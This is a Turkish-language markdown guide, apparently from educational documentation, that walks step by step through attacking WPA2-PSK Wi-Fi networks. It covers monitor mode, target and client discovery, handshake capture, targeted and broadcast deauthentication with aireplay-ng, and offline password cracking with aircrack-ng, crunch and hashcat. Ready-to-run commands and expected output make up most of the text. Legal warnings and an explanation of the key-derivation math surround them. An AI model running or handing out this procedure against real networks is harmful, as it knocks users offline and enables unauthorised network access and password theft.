# 🎯 Saldırı Metodolojisi - WPA2 Handshake Yakalama

Bu doküman, WPA2-PSK ağlarında 4-Way Handshake yakalama ve parola kırma sürecinin adım adım açıklamasını içerir.

## ⚠️ Önemli Hatırlatma

> [!CAUTION]
> Bu teknikler yalnızca **kendi ağınızda** veya **yazılı izniniz olan ağlarda** kullanılmalıdır. İzinsiz erişim yasa dışıdır.

---

## Saldırı Akış Şeması

```
┌─────────────────────────────────────────────────────────────┐
│ Faz 1: Hazırlık                                             │
│  └─> WiFi adaptörünü monitor moduna alma                    │
└────────────────────────────────────┬────────────────────────┘
                                     │
┌─────────────────────────────────────▼───────────────────────┐
│ Faz 2: Keşif                                                │
│  └─> Çevredeki WPA2 ağlarını tarama ve hedef belirleme      │
└────────────────────────────────────┬────────────────────────┘
                                     │
┌─────────────────────────────────────▼───────────────────────┐
│ Faz 3: İzleme                                               │
│  └─> Hedef ağı dinleme ve paket yakalama                    │
└────────────────────────────────────┬────────────────────────┘
                                     │
┌─────────────────────────────────────▼───────────────────────┐
│ Faz 4: Handshake Yakalama                                   │
│  └─> 4-Way Handshake bekle VEYA deauth saldırısı yap       │
└────────────────────────────────────┬────────────────────────┘
                                     │
┌─────────────────────────────────────▼───────────────────────┐
│ Faz 5: Doğrulama                                            │
│  └─> Handshake'in başarıyla yakalandığını kontrol et        │
└────────────────────────────────────┬────────────────────────┘
                                     │
┌─────────────────────────────────────▼───────────────────────┐
│ Faz 6: Parola Kırma                                         │
│  └─> Offline dictionary/brute force saldırısı               │
└─────────────────────────────────────────────────────────────┘
```

---

## Faz 1: Hazırlık ve Kurulum

### Adım 1.1: WiFi Adaptörünü Tespit Etme

```bash
# Mevcut ağ arayüzlerini listele
iwconfig
```

**Beklenen çıktı:**
```
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated
```

- `wlan0` sizin WiFi arayüzünüzün adıdır (wlan1, wlp2s0 vb. de olabilir)

### Adım 1.2: Engelleyici Servisleri Durdurma

```bash
# NetworkManager ve wpa_supplicant gibi servisleri durdur
sudo airmon-ng check kill
```

**Ne yapar:**
- `NetworkManager`: Normal WiFi bağlantılarını yöneten servisi durdurur
- `wpa_supplicant`: WPA yöneticisini kapatır
- Bu servisler monitor mode ile çakışır, bu yüzden durdurulması gerekir

> [!WARNING]
> Bu komut internet bağlantınızı kesecektir! Gerekli dosyaları önceden indirin.

### Adım 1.3: Monitor Modunu Etkinleştirme

```bash
# WiFi adaptörünü monitor moduna al
sudo airmon-ng start wlan0
```

**Beklenen çıktı:**
```
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271

                (mac80211 monitor mode vif enabled)
Interface wlan0mon is created
```

Artık yeni bir arayüz oluşturuldu: **wlan0mon** (veya wlan0 yerine kullandığınız ismin sonuna "mon" eklenmiş hali)

### Adım 1.4: Monitor Modunu Doğrulama

```bash
# Monitor modunun aktif olduğunu kontrol et
iwconfig wlan0mon
```

**Beklenen çıktı:**
```
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
```

✅ "Mode:Monitor" görüyorsanız başarılı!

---

## Faz 2: Ağ Keşfi ve Hedef Belirleme

### Adım 2.1: Çevredeki Ağları Tarama

```bash
# Tüm ağları tara
sudo airodump-ng wlan0mon
```

**Çıktı Açıklaması:**

```
CH  6 ][ Elapsed: 48 s ][ 2024-12-20 18:00

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -42      127       45    2   6  270  WPA2 CCMP   PSK  MyHomeWiFi
11:22:33:44:55:66  -67       89       12    0  11  130  WPA2 CCMP   PSK  NeighborWiFi
```

**Kolonlar:**
- **BSSID**: Modem MAC adresi (erişim noktası)
- **PWR**: Sinyal gücü (daha yüksek = daha yakın)
- **Beacons**: Beacon frame sayısı
- **#Data**: Veri paketi sayısı
- **CH**: Kanal numarası
- **ENC**: Şifreleme türü (WPA2 arıyoruz)
- **CIPHER**: Şifreleme algoritması (CCMP = AES)
- **AUTH**: Kimlik doğrulama (PSK = Pre-Shared Key)
- **ESSID**: Ağ adı (SSID)

### Adım 2.2: Hedef Ağı Seçme

Kriterleri:
1. **WPA2 PSK** olmalı (WEP veya açık ağ değil)
2. **Güçlü sinyal** (-50 dBm civarı ideal)
3. **Aktif istemci** olmalı (#Data > 0)

**Not edin:**
- `BSSID`: `AA:BB:CC:DD:EE:FF`
- `ESSID`: `MyHomeWiFi`
- `CH`: `6`

### Adım 2.3: Bağlı İstemcileri Görüntüleme

```bash
# Belirli bir ağı izle
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

**Parametre Açıklaması:**
- `-c 6`: Sadece kanal 6'yı dinle
- `--bssid AA:BB:CC:DD:EE:FF`: Sadece bu BSSID'yi izle
- `wlan0mon`: Monitor mode arayüzü

**Çıktıda istemcileri göreceksiniz:**

```
STATION            PWR   Rate    Lost    Frames  Probe
77:88:99:AA:BB:CC  -38    0 - 1      0       34  MyHomeWiFi
```

- **STATION**: İstemci MAC adresi (telefon, laptop vb.)
- **Frames**: Paket sayısı (>0 ise aktif)

---

## Faz 3: Handshake Yakalama

### Adım 3.1: Paket Yakalamayı Başlatma

```bash
# Handshake'i dosyaya kaydet
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**Parametre Açıklaması:**
- `-w capture`: Çıktı dosya adı (`capture-01.cap`, `capture-01.csv` vb. oluşturulur)
- Paketler `.cap` uzantılı dosyaya kaydedilir

**Çalışırken:**
```
CH  6 ][ Elapsed: 2 mins ][ 2024-12-20 18:05 ][ WPA handshake: AA:BB:CC:DD:EE:FF

BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -42 100      487      152    4   6  270  WPA2 CCMP   PSK  MyHomeWiFi

STATION            PWR   Rate    Lost    Frames  Probe
77:88:99:AA:BB:CC  -36    0 - 1      0      87
```

### Adım 3.2: Handshake Yakalamayı Bekleme

İki senaryo var:

#### Senaryo A: Pasif Bekleme (Şans Faktörü)

Eğer bir cihaz doğal olarak bağlanırsa handshake otomatik yakalanır:
- İstemci yeni bağlanıyor
- İstemci bağlantısı kopuyor ve tekrar bağlanıyor
- Modem yeniden başlatılıyor

**Bekleme süresi**: Dakikalar ~ saatler (belirsiz)

#### Senaryo B: Aktif Tetikleme (Deauth Saldırısı) ⚡

Bağlı bir istemciyi **zorla** bağlantıyı kesmek için deauthentication saldırısı yapılır.

---

## Faz 4: Deauthentication Saldırısı

### Deauth Saldırısı Nedir?

IEEE 802.11 standardında, bir erişim noktası veya istemci "deauthentication frame" göndererek bağlantıyı sonlandırabilir. Bu frameler **şifrelenmez** ve **kimlik doğrulama gerektirmez**.

Saldırgan, AP'nin MAC adresini taklit ederek istemciye sahte deauth frame gönderir.

### Adım 4.1: Yeni Terminal Açma

**Önemli:** `airodump-ng` çalışmaya devam etmeli. Yeni bir terminal penceresi açın.

### Adım 4.2: Deauth Saldırısını Başlatma

```bash
# Belirli bir istemciye deauth gönder
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 77:88:99:AA:BB:CC wlan0mon
```

**Parametre Açıklaması:**
- `--deauth 10`: 10 adet deauth frame gönder
- `-a AA:BB:CC:DD:EE:FF`: Access Point (BSSID)
- `-c 77:88:99:AA:BB:CC`: Hedef istemci (STATION)
- `wlan0mon`: Monitor mode arayüzü

**Alternatif: Tüm istemcilere broadcast deauth**
```bash
# Tüm istemcileri kopar
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```
(Bu durumda `-c` parametresi kullanılmaz)

### Adım 4.3: Sonuçları Gözlemleme

**İstemci tarafında:**
- WiFi bağlantısı kesilir
- Cihaz otomatik olarak tekrar bağlanmaya çalışır
- **4-Way Handshake gerçekleşir** 🎯

**airodump-ng ekranınızda:**
```
[ WPA handshake: AA:BB:CC:DD:EE:FF
```

✅ Sağ üst köşede bu mesajı gördüğünüzde başarılı!

---

## Faz 5: Handshake Doğrulama

### Adım 5.1: Yakalanan Dosyayı Kontrol Etme

```bash
# Handshake'in geçerli olup olmadığını kontrol et
aircrack-ng capture-01.cap
```

**Beklenen çıktı:**
```
Opening capture-01.cap
Reading packets, please wait...

   #  BSSID              ESSID                     Encryption
   1  AA:BB:CC:DD:EE:FF  MyHomeWiFi                WPA (1 handshake)

Index number of target network ? 1
```

"**1 handshake**" yazıyorsa ✅ başarılı!

### Adım 5.2: İlk Terminal'i Durdurma

`airodump-ng` çalıştıran terminalde:
- `Ctrl+C` basarak durdurun
- Artık `capture-01.cap` dosyanız hazır

---

## Faz 6: Parola Kırma ve Analiz

### Yöntem 1: Dictionary Attack (Sözlük Saldırısı)

En yaygın yöntem - bilinen parola listesiyle deneme.

#### Adım 6.1: Wordlist Hazırlama

**Seçenek A: Rockyou.txt (En Popüler)**
```bash
# Kali Linux'ta varsayılan olarak bulunur
ls /usr/share/wordlists/rockyou.txt.gz

# Sıkıştırmayı aç
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Seçenek B: Crunch ile Özel Liste**
```bash
# 8-10 karakter, sadece sayı
crunch 8 10 0123456789 -o numberlist.txt

# 8 karakter, küçük harf + sayı
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum.txt
```

#### Adım 6.2: Aircrack-ng ile Kırma

```bash
# Sözlük saldırısı başlat
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

**Parametre Açıklaması:**
- `-w`: Wordlist dosyası
- `-b`: Hedef BSSID
- `capture-01.cap`: Yakalanan handshake dosyası

**Çalışırken:**
```
Aircrack-ng 1.6

[00:02:34] 145678/14344391 keys tested (1024.56 k/s)

Current passphrase: Password123

Master Key     : XX XX XX XX XX XX XX XX...
Transient Key  : YY YY YY YY YY YY YY YY...
EAPOL HMAC     : ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ...
```

**Başarılı olursa:**
```
KEY FOUND! [ SuperSecretPassword123 ]
```

### Yöntem 2: Hashcat ile GPU Accelerated Kırma

Hashcat, GPU kullanarak çok daha hızlı kırma sağlar.

#### Adım 6.3: .cap Dosyasını Hashcat Formatına Çevirme

```bash
# cap2hashcat veya hcxtools kullan
hcxpcapngtool -o hash.hc22000 capture-01.cap
```

#### Adım 6.4: Hashcat ile Kırma

```bash
# WPA2 (hash mode 22000) ile sözlük saldırısı
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

**Hız Karşılaştırması:**
- **CPU (aircrack-ng)**: ~1,000-5,000 keys/saniye
- **GPU (hashcat)**: ~100,000-500,000 keys/saniye (donanıma bağlı)

---

## Saldırının Arkasındaki Matematik

### Parola Deneme Süreci

Her parola denemesi için:

```
1. PMK = PBKDF2-HMAC-SHA1(password_guess, SSID, 4096, 256)
2. PTK = PRF-512(PMK, ANonce, SNonce, MAC_AP, MAC_Client)
3. KCK = PTK[0:128]
4. MIC_calculated = HMAC-SHA1(KCK, EAPOL_frame)
5. if MIC_calculated == MIC_captured:
       → PAROLA BULUNDU!
```

### Neden Bu Kadar Yavaş?

- **PBKDF2 4096 iterasyon**: Her deneme için 4096 HMAC-SHA1 hesabı
- **Tek bir deneme**: ~10ms (CPU'da)
- **1 milyon deneme**: ~3 saat

### Güçlü Parola Etkisi

| Parola Tipi | Karakter Uzayı | Kombinasyon Sayısı | Tahmini Süre |
|-------------|----------------|---------------------|--------------|
| 8 digit sayı | 10^8 | 100 milyon | ~11 saat |
| 8 alfanumerik (küçük) | 36^8 | 2.8 trilyon | ~9 yıl |
| 10 alfanumerik (büyük+küçük) | 62^10 | 839 quadrilyon | milyonlarca yıl |
| 16 karmaşık | 94^16 | ~10^31 | evren ömründen fazla |

---

## Yaygın Sorunlar

### Handshake Yakalanmıyor

**Olası nedenler:**
1. İstemci bağlı değil (aktif cihaz yok)
2. Deauth saldırısı çalışmadı
3. Kanal değişti (airodump-ng yanlış kanalda)

**Çözüm:**
- Daha fazla deauth paketi gönderin: `--deauth 20`
- Farklı istemci deneyin
- Modemin yakınında olduğunuzdan emin olun

### Aircrack-ng "No Valid Handshake" Hatası

**Çözüm:**
```bash
# Handshake kalitesini kontrol et
aircrack-ng -w wordlist.txt capture-01.cap
```

4 mesajın tamamının yakalandığından emin olun.

### Parola Listede Yok

**Gerçek dünya senaryosu:**
- Rockyou.txt ~14 milyon parola içerir
- Eğer parola listede yoksa, bulunamaz
- Brute force gerekebilir (ancak çok yavaş)

---

## Etik ve Yasal Notlar

> [!WARNING]
> **Bu teknikler yalnızca:**
> - Kendi ağınızda
> - Yazılı izniniz olan test ortamlarında
> - Eğitim laboratuvarlarında
> 
> kullanılmalıdır.

**Yasa dışı kullanım sonuçları:**
- Siber Güvenlik Yasası kapsamında ceza
- Hapis cezası
- Para cezası

---

## Sonraki Adımlar

- **[Önleme Yöntemleri](prevention-methods.md)**: Bu saldırılardan nasıl korunulur
- **[Sorun Giderme](troubleshooting.md)**: Sık karşılaşılan problemler

---

**Önemli:** Bu dokümantasyon yalnızca eğitim amaçlıdır. Gerçek dünya uygulamalarında yasal ve etik kurallara uyunuz.
